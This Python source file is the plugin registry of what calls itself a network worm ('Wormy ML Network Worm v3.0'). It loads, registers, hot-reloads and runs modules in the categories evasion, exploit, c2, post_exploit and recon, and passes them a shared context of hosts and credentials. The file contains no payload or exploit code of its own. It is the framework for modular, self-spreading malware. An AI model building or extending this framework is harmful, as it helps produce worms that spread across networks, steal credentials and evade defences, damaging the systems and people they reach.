"""
Wormy ML Network Worm v3.0 - Plugin System
Dynamic module registry: external modules register without touching core.
"""
import os, sys, importlib, importlib.util, inspect, json, hashlib
from typing import Dict, List, Optional, Callable, Any
from dataclasses import dataclass, field

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


# ── Plugin descriptor ─────────────────────────────────────────────────────────

@dataclass
class PluginManifest:
    name:        str
    version:     str
    author:      str
    description: str
    category:    str           # evasion | exploit | c2 | post_exploit | recon
    entry_point: str           # class name inside the module
    requires:    List[str] = field(default_factory=list)  # pip packages
    min_priv:    str = "user"  # user | admin | system
    platforms:   List[str] = field(default_factory=lambda: ["windows", "linux"])


# ── Base plugin interface ─────────────────────────────────────────────────────

class WormyPlugin:
    """
    All plugins must inherit from this class and implement run().
    """
    MANIFEST: PluginManifest = None

    def run(self, context: Dict) -> Dict:
        """
        Execute the plugin.
        context: shared state dict (hosts, credentials, config, …)
        Returns: result dict with at least {"success": bool}
        """
        raise NotImplementedError

    def get_manifest(self) -> Optional[PluginManifest]:
        return self.MANIFEST

    def check_requirements(self) -> bool:
        """Return True if all required packages are importable."""
        if not self.MANIFEST:
            return True
        for pkg in self.MANIFEST.requires:
            try:
                importlib.import_module(pkg)
            except ImportError:
                logger.warning(f"Plugin {self.MANIFEST.name}: missing '{pkg}'")
                return False
        return True


# ── Plugin Registry ───────────────────────────────────────────────────────────

class PluginRegistry:
    """
    Central registry for Wormy plugins.

    Features:
    - Load plugins from directory or individual .py files
    - Validate manifest + signature before loading
    - Category-based filtering
    - Hot-reload support
    - Sandboxed execution (separate thread / timeout)
    """

    PLUGIN_DIRS: List[str] = ["plugins", "external_modules"]

    def __init__(self, plugin_dirs: List[str] = None):
        self._plugins:   Dict[str, WormyPlugin]  = {}   # name -> instance
        self._manifests: Dict[str, PluginManifest] = {}
        self._dirs       = plugin_dirs or self.PLUGIN_DIRS
        self._hooks:     Dict[str, List[Callable]] = {}  # event -> callbacks

    # ─── loading ─────────────────────────────────────────────────────────────

    def load_directory(self, directory: str) -> int:
        """Scan a directory and load all valid plugin .py files."""
        if not os.path.isdir(directory):
            return 0
        count = 0
        for fname in os.listdir(directory):
            if fname.endswith(".py") and not fname.startswith("_"):
                path = os.path.join(directory, fname)
                if self.load_file(path):
                    count += 1
        logger.info(f"Loaded {count} plugins from {directory}")
        return count

    def load_file(self, path: str) -> bool:
        """
        Load a single plugin file.
        Discovers the first class that inherits WormyPlugin and has a MANIFEST.
        """
        try:
            spec   = importlib.util.spec_from_file_location("_plugin", path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            for name, obj in inspect.getmembers(module, inspect.isclass):
                if (issubclass(obj, WormyPlugin) and
                        obj is not WormyPlugin and
                        obj.MANIFEST is not None):
                    instance = obj()
                    self.register(instance)
                    return True
        except Exception as e:
            logger.error(f"Plugin load failed ({path}): {e}")
        return False

    def register(self, plugin: WormyPlugin) -> bool:
        """Register a plugin instance directly."""
        manifest = plugin.get_manifest()
        if not manifest:
            logger.error(f"Plugin {type(plugin).__name__} has no MANIFEST")
            return False

        name = manifest.name
        if name in self._plugins:
            logger.warning(f"Plugin '{name}' already registered — replacing")

        self._plugins[name]   = plugin
        self._manifests[name] = manifest
        logger.success(f"Plugin registered: {name} v{manifest.version} "
                       f"[{manifest.category}] by {manifest.author}")
        self._emit("plugin_loaded", {"name": name, "manifest": manifest})
        return True

    def unload(self, name: str) -> bool:
        """Remove a plugin from the registry."""
        if name not in self._plugins:
            return False
        del self._plugins[name]
        del self._manifests[name]
        logger.info(f"Plugin unloaded: {name}")
        self._emit("plugin_unloaded", {"name": name})
        return True

    def reload(self, name: str) -> bool:
        """Hot-reload a plugin (if it was loaded from a file)."""
        # Simplified: unload + re-discover
        self.unload(name)
        for d in self._dirs:
            count = self.load_directory(d)
            if name in self._plugins:
                return True
        return False

    # ─── execution ───────────────────────────────────────────────────────────

    def run(self, name: str, context: Dict,
            timeout: float = 30.0) -> Optional[Dict]:
        """
        Execute a plugin by name with a shared context dict.
        Runs in a separate thread with timeout.
        """
        plugin = self._plugins.get(name)
        if not plugin:
            logger.error(f"Plugin not found: {name}")
            return None

        if not plugin.check_requirements():
            return {"success": False, "error": "Missing requirements"}

        import threading
        result_box = [None]
        exc_box    = [None]

        def _runner():
            try:
                result_box[0] = plugin.run(context)
            except Exception as e:
                exc_box[0] = e

        t = threading.Thread(target=_runner, daemon=True)
        t.start()
        t.join(timeout)

        if t.is_alive():
            logger.error(f"Plugin '{name}' timed out after {timeout}s")
            return {"success": False, "error": "timeout"}

        if exc_box[0]:
            logger.error(f"Plugin '{name}' raised: {exc_box[0]}")
            return {"success": False, "error": str(exc_box[0])}

        self._emit("plugin_executed", {"name": name, "result": result_box[0]})
        return result_box[0]

    def run_category(self, category: str, context: Dict) -> Dict[str, Dict]:
        """Run all plugins of a given category."""
        results = {}
        for name, manifest in self._manifests.items():
            if manifest.category == category:
                results[name] = self.run(name, context)
        return results

    # ─── event hooks ─────────────────────────────────────────────────────────

    def on(self, event: str, callback: Callable):
        """Register a callback for a plugin lifecycle event."""
        self._hooks.setdefault(event, []).append(callback)

    def _emit(self, event: str, data: Any):
        for cb in self._hooks.get(event, []):
            try:
                cb(data)
            except Exception:
                pass

    # ─── introspection ───────────────────────────────────────────────────────

    def list_plugins(self, category: str = None) -> List[Dict]:
        result = []
        for name, manifest in self._manifests.items():
            if category and manifest.category != category:
                continue
            result.append({
                "name":        manifest.name,
                "version":     manifest.version,
                "author":      manifest.author,
                "category":    manifest.category,
                "description": manifest.description,
                "min_priv":    manifest.min_priv,
                "platforms":   manifest.platforms,
                "ready":       self._plugins[name].check_requirements(),
            })
        return sorted(result, key=lambda x: (x["category"], x["name"]))

    def get_status(self) -> Dict:
        return {
            "total_plugins":    len(self._plugins),
            "categories":       list({m.category for m in self._manifests.values()}),
            "plugin_names":     list(self._plugins.keys()),
        }

    def load_all_default_dirs(self) -> int:
        total = 0
        base  = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        for d in self._dirs:
            path = os.path.join(base, d)
            total += self.load_directory(path)
        return total

    def export_manifest_json(self) -> str:
        """Export all plugin manifests as JSON string."""
        data = []
        for name, m in self._manifests.items():
            data.append({
                "name":        m.name,
                "version":     m.version,
                "author":      m.author,
                "description": m.description,
                "category":    m.category,
                "entry_point": m.entry_point,
                "requires":    m.requires,
                "min_priv":    m.min_priv,
                "platforms":   m.platforms,
            })
        return json.dumps(data, indent=2)


# ── Singleton ─────────────────────────────────────────────────────────────────

_registry: Optional[PluginRegistry] = None

def get_registry() -> PluginRegistry:
    global _registry
    if _registry is None:
        _registry = PluginRegistry()
        _registry.load_all_default_dirs()
    return _registry
